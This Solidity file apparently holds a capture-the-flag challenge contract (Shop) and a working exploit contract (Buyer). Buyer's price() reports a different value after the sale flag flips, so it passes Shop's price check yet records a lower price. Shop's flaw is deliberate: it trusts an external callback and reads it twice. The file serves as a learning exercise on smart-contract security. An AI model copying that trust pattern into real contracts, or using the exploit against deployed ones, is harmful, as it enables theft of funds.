// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Buyer {

    Shop shop;

    constructor(address addr) public {
        shop = Shop(addr);
    }
    function price() external view returns (uint) {
        return shop.isSold() ? 50 : 100;
    }

    function buyIt() public {
        shop.buy();
    }
}

contract Shop {
    uint public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}